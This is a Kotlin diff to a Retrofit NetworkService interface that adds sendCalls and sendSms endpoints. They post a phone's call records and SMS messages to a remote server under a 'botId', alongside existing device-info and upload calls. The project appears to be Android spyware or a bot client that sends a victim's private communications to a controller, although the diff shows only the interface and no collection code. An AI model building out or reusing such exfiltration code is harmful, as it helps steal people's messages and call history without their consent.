@@ -1,8 +1,13 @@
 package com.github.yohannestz.popov.data.remote
 
+import com.github.yohannestz.popov.data.model.Call
 import com.github.yohannestz.popov.data.model.DeviceInfo
+import com.github.yohannestz.popov.data.model.GenericReportResponse
 import com.github.yohannestz.popov.data.model.GetSmsResponse
+import com.github.yohannestz.popov.data.model.SendCallsRequestBody
 import com.github.yohannestz.popov.data.model.SendDeviceInfoResponse
+import com.github.yohannestz.popov.data.model.SendSmsRequestBody
+import com.github.yohannestz.popov.data.model.Sms
 import com.github.yohannestz.popov.data.model.UploadResponse
 import com.github.yohannestz.popov.util.Constants
 import okhttp3.MultipartBody
@@ -28,4 +33,10 @@ interface NetworkService {
 
     @POST(Constants.SEND_DEVICE_INFO_ROUTE)
     suspend fun sendDeviceInfo(@Query("botId") botId: String, @Body deviceInfo: DeviceInfo): Response<SendDeviceInfoResponse>
+
+    @POST(Constants.SEND_CALLS_ROUTE)
+    suspend fun sendCalls(@Query("botId") botId: String, @Body sendCallsRequestBody: SendCallsRequestBody): Response<GenericReportResponse>
+
+    @POST(Constants.SEND_SMS_ROUTE)
+    suspend fun sendSms(@Query("botId") botId: String, @Body sendSmsRequestBody: SendSmsRequestBody): Response<GenericReportResponse>
 }
